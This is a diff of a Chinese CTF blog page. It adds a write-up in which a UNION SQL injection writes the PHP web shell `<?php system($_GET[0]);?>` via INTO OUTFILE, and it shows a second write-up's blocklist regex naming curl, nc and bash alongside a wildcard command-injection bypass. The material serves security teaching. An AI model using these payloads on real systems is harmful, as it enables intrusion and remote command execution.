@@ -3610,6 +3610,179 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-20 16:15:00+00:00">2026-11-20</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../sql%E6%B3%A8%E5%85%A5/" class="md-meta__link">SQL注入</a>, 
+              <a href="./" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="flag-shell"><a class="toclink" href="../../myctf-stellar-archive-sqli/">星辉魔女名鉴 — 库里没有 flag，那就写一个 shell 进去</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：SQL 注入 — <code>INTO OUTFILE</code> 写文件 getshell</p>
+<p><strong>Flag</strong>：<code>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_1">题目概述</a></h3>
+<p>页面底部有个“终端”入口，进去是一块维护控制台。<strong>提示是日语的，先翻译：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>$ archive --status
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>[ ok ] 名鑑検索サービス: alive
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>$ archive --storage
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
+</span></code></pre></div>
+<p><strong>翻译过来关键的就一行：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
+</span></code></pre></div>
+<p><strong>这句话等于提前告诉你：</strong><code>/io/</code> 目录可写<strong>。</strong>后面所有操作都是围着这一句展开的。**</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-1">Step 1：找注入点</a></h4>
+<p><strong>页面有个筛选框，输入 <code>rarity &gt;= 3</code> 会返回一段 JSON，里面把拼好的 SQL 也打出来了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
+</span></code></pre></div>
+<p><strong>输一个单引号（<code>'</code>），报错——注入点确认。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-2">Step 2：确定列数</a></h4>
+<p><strong>原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+</span></code></pre></div>
+<p><strong>能正常返回，说明列数对上了。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-3">Step 3：爆库表列</a></h4>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<p><strong><code>-- -</code> 是注释掉后面原来的 <code>ORDER BY id ASC</code>（注意 <code>--</code> 后面必须有一个空格）。</strong></p>
+<p><strong>扫出来的表里，与题目相关的就两张：<code>witches</code>（正常数据）和 <code>archive_notes</code>（看起来像隐藏内容）。</strong></p>
+<h4 id="step-4flag"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-4flag">Step 4：库里的“flag”是假的</a></h4>
+<p><strong>读 <code>archive_notes</code>，看到这么一条：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
+</span></code></pre></div>
+<p><strong>注意它自己写着 <code>d3c0y_..._d0_n0t_submit</code>——</strong>这是<strong>诱饵</strong>，交上去就是错的。**</p>
+<p><strong>这题的 flag 不在数据库里。</strong></p>
+<h4 id="step-5"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-5">Step 5：看看能不能写文件</a></h4>
+<p><strong>既然提示说 <code>/io/</code> 可写，先确认数据库的写权限目录：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<p><strong>返回：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>/var/www/html/io/
+</span></code></pre></div>
+<p><strong><code>@@secure_file_priv</code> 就是 MySQL/MariaDB 允许 <code>INTO OUTFILE</code> 写入的目录——和终端里那行提示</strong>完全对上<strong>了。</strong></p>
+<p><strong>这说明出题人是故意把这条路留给你。</strong></p>
+<h4 id="step-6-webshell"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-6-webshell">Step 6：写一个 webshell</a></h4>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<p><strong>几个必须注意的地方：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
+</span></code></pre></div>
+<p><strong>访问：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>/io/C.php?0=cat%20/flag
+</span></code></pre></div>
+<p><strong>得到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>注入点</td>
+<td>筛选条件 <code>rarity</code>，单引号报错确认</td>
+</tr>
+<tr>
+<td>列数</td>
+<td>原查询 6 列，UNION 也要 6 列</td>
+</tr>
+<tr>
+<td>注释</td>
+<td><code>-- -</code>（<code>--</code> 后必须空格），用来吃掉 <code>ORDER BY</code></td>
+</tr>
+<tr>
+<td>提示的价值</td>
+<td>终端已告知 <code>/io/</code> 可写</td>
+</tr>
+<tr>
+<td>写权限目录</td>
+<td><code>@@secure_file_priv</code> = <code>/var/www/html/io/</code>，与提示吻合</td>
+</tr>
+<tr>
+<td>写 shell</td>
+<td><code>INTO OUTFILE</code> + <code>$_GET[0]</code>（避开引号转义）</td>
+</tr>
+<tr>
+<td>诱饵</td>
+<td><code>archive_notes</code> 里的 <code>d3c0y_...</code> 是假的，别交</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1">-- ① 确认列数</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1">-- ② 爆表</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1">-- ③ 看写权限目录</span>
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="c1">-- ④ 写 shell</span>
+</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>访问：/io/C.php?0=cat /flag
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① <code>INFORMATION_SCHAME</code> 拼错</strong></p>
+<p>是 <code>INFORMATION_SCHEMA</code>。<strong>拼错不会报注入失败，只会返回空——很容易误判成“表不存在”。</strong></p>
+<p><strong>② 忘了 <code>-- -</code> 注释</strong></p>
+<p>后面那句 <code>ORDER BY id ASC</code> 还在，UNION 的结果会被排序吞掉，看起来像“没插进去”。</p>
+<p><strong>③ 双引号被 MySQL 转义</strong></p>
+<p><code>$_GET["cmd"]</code> 写进文件会变成 <code>$_GET[\"cmd\"]</code>，PHP 直接语法错误。<strong>用 <code>$_GET[0]</code> 或 <code>$_GET[cmd]</code>。</strong></p>
+<p><strong>④ 反复往同一个文件名写</strong></p>
+<p><code>INTO OUTFILE</code> 不允许覆盖已存在文件。<strong>写失败就换个名字（C.php → D.php）。</strong></p>
+<p><strong>⑤ 交了诱饵 flag</strong></p>
+<p><code>archive_notes</code> 里那条自己写着 <code>d0_n0t_submit</code>。<strong>库里没有真 flag，必须有写文件这一步。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-20 15:15:00+00:00">2026-11-20</time></li>
         
           <li class="md-meta__item">
@@ -3640,11 +3813,11 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-blindgl4g/#_1">题目概述</a></h3>
 <p>跟着提示摸到 <code>get_gl4g.php</code>，页面直接把过滤规则吐了出来：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="x">/\b(flag|cat|tac|head|tail|more|less|nl|od|xxd|hexdump|base64|strings|grep|awk|sed|cp|mv|rm|ln|find|xargs|ls|dir|tree|wget|curl|nc|ncat|netcat|telnet|socat|ssh|scp|bash|sh|zsh|dash|php|python3|python|perl|ruby|lua|env|export|declare|eval)\b|[`$(){}&lt;&gt;|&amp;'"]|\\/i</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="x">/\b(flag|cat|tac|head|tail|more|less|nl|od|xxd|hexdump|base64|strings|grep|awk|sed|cp|mv|rm|ln|find|xargs|ls|dir|tree|wget|curl|nc|ncat|netcat|telnet|socat|ssh|scp|bash|sh|zsh|dash|php|python3|python|perl|ruby|lua|env|export|declare|eval)\b|[`$(){}&lt;&gt;|&amp;'"]|\\/i</span>
 </span></code></pre></div>
 <p><strong>这条正则把能用的东西几乎都封了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>关键词    flag、cat、ls、sh、bash、python、grep、base64……
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>符号      反引号、$、(、)、{、}、&lt;、&gt;、|、&amp;、单双引号、反斜杠
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>关键词    flag、cat、ls、sh、bash、python、grep、base64……
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>符号      反引号、$、(、)、{、}、&lt;、&gt;、|、&amp;、单双引号、反斜杠
 </span></code></pre></div>
 <p><strong>但仔细看，<code>;</code>、<code>?</code>、<code>*</code>、<code>/</code>、<code>=</code>、空格都没在名单里。</strong></p>
 <p><strong>这就是突破口。</strong></p>
@@ -3701,8 +3874,8 @@
 <p><strong>这也意味着：只要让 <code>cat</code> 不以“完整单词”的形式出现，就能绕过去。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-blindgl4g/#step-2">Step 2：命令名和文件名都得“变形”</a></h4>
 <p><strong>要执行的两样东西，都在黑名单里：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>命令 cat        → 被拦
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>参数 /flag      → 里含 flag，被拦
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>命令 cat        → 被拦
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>参数 /flag      → 里含 flag，被拦
 </span></code></pre></div>
 <p><strong>所以思路是：</strong>两个都用通配符拼出来，让它们的字面形式里既没有 <code>cat</code> 也没有 <code>flag</code>。**</p>
 <h4 id="step-3binca-bincat"><a class="toclink" href="../../myctf-blindgl4g/#step-3binca-bincat">Step 3：<code>/bin/ca?</code> 为什么能变成 <code>/bin/cat</code></a></h4>
@@ -3710,28 +3883,28 @@
 <p><strong>所以直接写绝对路径就够了：<code>/bin/cat</code>。</strong></p>
 <p><strong>但这串里含 <code>cat</code>（<code>/bin/cat</code> 结尾就是 cat），照样被 <code>\b</code> 拦。</strong></p>
 <p><strong>那就把最后一个字符换成通配符：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>/bin/ca?
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>/bin/ca?
 </span></code></pre></div>
 <p><strong>shell 在展开通配符时，会去 <code>/bin</code> 目录里找所有“ca 开头、后面一个字符”的文件。</strong></p>
 <p><strong><code>/bin</code> 下以 <code>ca</code> 开头的只有 <code>cat</code>——所以 <code>?</code> 精准匹配到它。</strong></p>
 <p><strong>而字符串 <code>/bin/ca?</code> 里</strong>没有 <code>cat</code> 这三个连续字符<strong>，正则匹配不到。</strong></p>
 <h4 id="step-4fla-flag"><a class="toclink" href="../../myctf-blindgl4g/#step-4fla-flag">Step 4：<code>/fla?</code> 匹配 <code>/flag</code></a></h4>
 <p><strong>同理，参数里的 <code>flag</code> 也要拆：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>/fla?
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>/fla?
 </span></code></pre></div>
 <p><strong>文件系统里以 <code>fla</code> 开头的目标文件就是 <code>/flag</code>，<code>?</code> 匹配那个 <code>g</code>。</strong></p>
 <p><strong>字符串里没有 <code>flag</code> 这个完整单词，<code>\b</code> 拦不住。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-blindgl4g/#step-5">Step 5：拼起来</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>;/bin/ca? /fla?
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>;/bin/ca? /fla?
 </span></code></pre></div>
 <p><strong><code>;</code> 是命令分隔符——前面可以什么都没有（或者接在一个已有参数后面），后面接我们的命令。</strong></p>
 <p><strong>为什么需要 <code>;</code>：</strong>注入点通常在一段已有的 shell 语句里，前面不加分隔符，你写的命令会被当成前一条命令的参数。**</p>
 <p><strong>请求一次，回显里直接看到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>[2026-11-20 07:02:14] ;/bin/ca? /fla?
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>[2026-11-20 07:02:14] ;/bin/ca? /fla?
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}
 </span></code></pre></div>
 <p><strong>顺便，<code>;id</code> 也能跑：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </span></code></pre></div>
 <p><strong>说明命令确实执行了，不是回显注入。</strong></p>
 <hr />
@@ -3773,8 +3946,8 @@
 <details class="note">
 <summary>还有其他可用姿势</summary>
 <p><strong><code>echo</code> 不在黑名单里</strong>，可以直接列目录（不需要 <code>ls</code>）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>;echo /f*
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>;echo /bin/c*
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>;echo /f*
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>;echo /bin/c*
 </span></code></pre></div>
 <p><strong><code>*</code> 也会展开成路径，等于“用 echo 当 ls 用”。</strong></p>
 <p><strong>另外 <code>?</code> 可以连续用：<code>/fla??</code> 表示“fla + 两个字符”。</strong></p>
